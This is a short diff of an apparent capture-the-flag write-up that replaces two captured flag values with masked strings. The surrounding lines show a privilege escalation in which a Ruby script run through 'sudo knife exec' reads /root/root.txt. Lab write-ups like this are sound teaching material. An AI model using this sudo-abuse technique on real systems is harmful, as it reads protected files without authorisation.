@@ -171,7 +171,7 @@ $ ls home/james
 user.txt
 
 $ cat home/james/user.txt
-a90760febfd2ef7c9091d21c9278a563
+a907****************************
 ```
 
 Now to priviledge escalate and grab the root flag. Its always smart to run sudo -l to see what the logged in user can use
@@ -197,7 +197,7 @@ Since knife can execute ruby scripts, we will make a quick script to read the ro
 $ echo "data = File.read(\"/root/root.txt\")\r\nputs data" > ~/flag.rb
 
 $ sudo knife exec ~/flag.rb
-42aba59bd6f8d5ab6d7ab1e9c83945bb
+42ab****************************
 ```
 
 Voila we have both flags!!
